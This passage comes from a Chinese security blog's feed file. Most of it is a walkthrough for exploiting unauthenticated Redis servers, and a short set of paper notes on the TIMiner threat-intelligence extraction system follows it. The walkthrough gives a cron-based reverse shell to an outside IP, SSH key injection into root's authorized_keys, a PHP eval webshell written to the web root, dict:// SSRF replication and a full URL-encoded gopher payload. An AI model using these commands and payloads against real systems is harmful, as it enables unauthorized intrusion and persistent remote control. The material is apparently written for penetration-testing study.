&lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个<span class="hljs-keyword">save</span>参数，如：<br>        <span class="hljs-keyword">save</span> 900 1<br>        <span class="hljs-keyword">save</span> 300 10<br>        <span class="hljs-keyword">save</span> 60 10000<br>    表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。<br><br>requirepass参数：<br>    格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br><br><span class="hljs-keyword">dir</span>参数：<br>    格式为<span class="hljs-keyword">dir</span>后接指定的路径，默认为<span class="hljs-keyword">dir</span> ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br><br>dbfilename参数：<br>    格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。<br><br>config命令：<br>    通过config命令可以读取和设置<span class="hljs-keyword">dir</span>参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了<span class="hljs-keyword">rename</span>-command参数来对其进行重命名操作，如<span class="hljs-keyword">rename</span>-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。<br><br>protected-mode参数：<br>    redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为<span class="hljs-keyword">no</span>。<br></code></pre></td></tr></table></figure><h2 id="getshell方法"><a href="#getshell方法" class="headerlink" title="getshell方法"></a>getshell方法</h2><h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><p>利用工具redis-ctl连接并查看相关信息为4.0.2版本</p><p>设置计划任务</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.32.115/4000 0&gt;&amp;1\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p>复现失败</p><h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>首先我们需要在攻击机上生成ssh公钥和私钥，密码设置为空</p><p><strong>ssh-keygen -t rsa</strong></p><p>将公钥写入key.txt当中（文件名无限制）</p><p>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p><p>导入内容（防止乱码）</p><p>cat key.txt| redis-cli -h 192.168.32.210 -x set putsshkey</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#设置路径</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh<br><span class="hljs-comment">#设置文件名</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-comment">#保存key值到root文件中</span><br>save<br></code></pre></td></tr></table></figure><h4 id="写入webshell远程连接服务器"><a href="#写入webshell远程连接服务器" class="headerlink" title="写入webshell远程连接服务器"></a>写入webshell远程连接服务器</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">#设置木马</span><br><span class="language-xml">set xxx &quot;\n\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\n\n&quot;</span><br><span class="language-xml">#然后修改路径为网站默认路径</span><br><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">#设置文件名</span><br><span class="language-xml">config set dbfilename shell.php</span><br><span class="language-xml">#最后save保存进去</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p>利用条件</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">知道网站根目录绝对路径（实际渗透过程中，这个方法通常需要搭配 <span class="hljs-built_in">phpinfo</span>() 等方法使用。）<br>无需是 root 起的 Redis<br>可适用于 Windows（非 ssh 连接）<br>一般无需 flushall 清空数据库（一定情况下也需要）<br></code></pre></td></tr></table></figure><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">#在从机上设置主机<br><span class="hljs-number">127.0.0.1:6380</span>&gt; slaveof <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> <span class="hljs-number">6381</span><br>OK<br>#在主机上设置键值对<br><span class="hljs-number">127.0.0.1:6381</span>&gt; set sean sheep<br>OK<br>#在从机上获取键值对<br><span class="hljs-number">127.0.0.1:6380</span>&gt; get sean<br><span class="hljs-string">&quot;sheep&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#先设置好保存的路径和保存的文件名</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/slaveof</span><span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">33.131</span><span class="hljs-symbol">:</span><span class="hljs-number">6379</span> <br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/www/admin/localhost_80/wwwroot</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:ssrf</span>.php<br><span class="hljs-comment">#然后进入主机进行主从复制操作，方法和上面的一样</span><br><span class="hljs-meta prompt_">127.0.0.1:6379&gt;</span> set xxx <span class="hljs-string">&quot;\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n&quot;</span><br><span class="hljs-comment">#再去web端执行save操作</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/save</span><br><span class="hljs-comment">#这样数据直接回同步到目标机，从而写入文件</span><br></code></pre></td></tr></table></figure><h2 id="SSRF-Redis未授权"><a href="#SSRF-Redis未授权" class="headerlink" title="SSRF+Redis未授权"></a>SSRF+Redis未授权</h2><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>gopher协议和dict协议一样需要使用redis内置的命令进行文件写入，只是payload更加复杂</p><p>我这里就用写入webshell来演示</p><p>下面这些是我们需要执行的命令</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">set 1 &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">config set dir /tmp</span><br><span class="language-xml">config set dbfilename shell.php</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p>这里我使用的是 <a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a> 工具</p><p>将上述执行的命令写入<code>redis.cmd</code>中</p><p>保存好后执行<code>python2 redis-over-gopher.py</code></p><p>生成payload后，若在在bp中还需要将payload再进行一次url编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%38</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%38</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%39</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%253</span><span class="hljs-keyword">c</span><span class="hljs-variable">%253</span>f<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2528</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%253</span>f<span class="hljs-variable">%253</span>e<span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2564</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2564</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2530</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TIMiner-自动从社交媒体中提取网络威胁情报</title>
    <link href="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <url>/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="TIMiner-Automatically-extracting-and-analyzing-categorized-cyber-threat-intelligence-from-social-data"><a href="#TIMiner-Automatically-extracting-and-analyzing-categorized-cyber-threat-intelligence-from-social-data" class="headerlink" title="TIMiner: Automatically extracting and analyzing categorized cyber threat intelligence from social data"></a>TIMiner: Automatically extracting and analyzing categorized cyber threat intelligence from social data</h1><h2 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h2><p>现有的大多数方法无法识别未知的IOC；无法自动生成带有域标签的分类 CTI，给一些威胁情报划分领域很困难</p><h2 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h2><p>基于卷积神经网络 （CNN） 的识别器，可自动识别 CTI 所属的域，以及分层 IOC 提取方法，将单词嵌入和句法依赖性无缝融合，可以识别看不见的 IOC 类型。生成特定域的网络威胁情报</p><h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><ul><li>开发基于 CNN 的自动化域识别器，以将 CTI 分配给它所影响的相应域。本研究中主要关注金融、政府、教育、物联网和工业控制系统。</li><li>提出一种基于词嵌入和句法依赖性的自动化 IOC 提取方法，从威胁描述文本中提取 IOC，既保证了预定义 IOC 提取的高精度，又能识别和提取不可见类型的 IOC。</li><li>提出了 Threat-Index，这是一种新的安全评估标准，用于评估不同领域的安全状态；Threat-Index 捕获多个域中威胁影响的差异，并量化每个域的威胁严重性。</li><li>分析了超过118000篇文本，对每个领域的威胁情报的演变有了更深层次的认识，最有趣的为以下方面：<ul><li>DDOS(分布式拒绝服务攻击)</li><li>Phishing（网络钓鱼）</li><li>Ransomware （勒索软件）</li></ul></li></ul><h2 id="TIMiner-总体框架"><a href="#TIMiner-总体框架" class="headerlink" title="TIMiner 总体框架"></a>TIMiner 总体框架</h2><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163700540.png" class="" title="image-20241104163700540"><h3 id="CTI域识别器"><a href="#CTI域识别器" class="headerlink" title="CTI域识别器"></a>CTI域识别器</h3><p>用于识别已知和未知的IOC，利用 kernel&#x3D;5 的 256 个过滤器来了解每个威胁描述的本地特征，然后将池化的特征向量拼接成一个完全连接的层。最后，利用 soft-max 激活函数计算 CTI 的每个域标签的概率。</p><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163727866.png" class="" title="image-20241104163727866"><p>处理过程算法：</p><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163746429.png" class="" title="image-20241104163746429"><h3 id="生成具有域标签的CTI"><a href="#生成具有域标签的CTI" class="headerlink" title="生成具有域标签的CTI"></a>生成具有域标签的CTI</h3><p>算法：</p><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163819109.png" class="" title="image-20241104163819109"><p>示例：</p><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163834406.png" class="" title="image-20241104163834406"><h3 id="识别IOC方法"><a href="#识别IOC方法" class="headerlink" title="识别IOC方法"></a>识别IOC方法</h3><ol><li><p>正则匹配</p><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104163901479.png" class="" title="image-20241104163901479"></li><li><p>深度识别：BiLSTM+CRF 识别 IOC（正则表达无法识别的 IOC）</p></li><li><p>词嵌入方法：利用word2vec模型实现一种有效的词表示方法，它超越了简单的句法规律，允许在嵌入式向量空间中进行简单的代数操作，</p></li></ol><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>DDOS:</p><ul><li>大多数教育性 DDoS 攻击是 TCP 洪水攻击；</li><li>大多数政府和 ICS DDoS 攻击是域名系统 （DNS） 反射器攻击；</li><li>对于金融 DDoS 攻击，黑客通常会不断向目标服务器提交查询脚本以请求资源。</li><li>在物联网DDoS攻击中，攻击者入侵暴露在互联网上的物联网设备（例如摄像头、传感器）以构建僵尸网络，而被感染的设备将由隐蔽的C&amp;C服务器远程控制。</li></ul><p>勒索软件：</p><ul><li>Petya 利用 CVE-20170199 漏洞进行网络钓鱼攻击，然后通过 EternalBlue 和 Eternal Ransom 漏洞传播。但是，WannaCry 会自动扫描 Windows 的 445 端口甚至电子信息屏幕，并在受感染的计算机和服务器中放置勒索软件、远程控制、特洛伊木马、矿工和其他恶意组件。</li></ul><p>网络钓鱼：</p><ul><li>从电子邮件网络钓鱼演变为鱼叉式网络钓鱼，并最终演变为最复杂的 Watering hole 网络钓鱼</li></ul><h2 id="攻击趋势分析结果"><a href="#攻击趋势分析结果" class="headerlink" title="攻击趋势分析结果"></a>攻击趋势分析结果</h2><img src="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/image-20241104164017392.png" class="" title="image-20241104164017392"><p>在本文中，提出了一种新的 CTI 提取框架 TIMiner，用于自动提取 IOC 并从社交媒体中生成带有域标签的分类 CTI。更具体地说，首先，提出了一种基于 CNN 变体的域标记方法，用于标记威胁描述的域标记。然后，提出了一种基于词嵌入和句法依赖性的分层 IOC 提取方法，该方法能够有效地识别未知的 IOC。最后，将 IOC 与其相应的域标记组合在一起，以生成特定于域的 CTI。特定于域的 CTI 可以与相关的 CTI 订阅者共享，并允许他们快速识别各自行业的安全状况。此外，还提出了 Threat-Index 来定量衡量每个域中不同类型攻击造成的威胁严重性。通过分析 TIMiner 生成的特定域 CTI，可以发现有关威胁的新见解，并执行威胁趋势分析，以促进为多个域设计更好的网络防御机制。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTI</tag>
      
      <tag>信息提取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>StackOverflow-代码实体识别</title>
    <link href="/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/"/>
    <url>/2024/10/13/StackOverflow-%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB/</url>
    
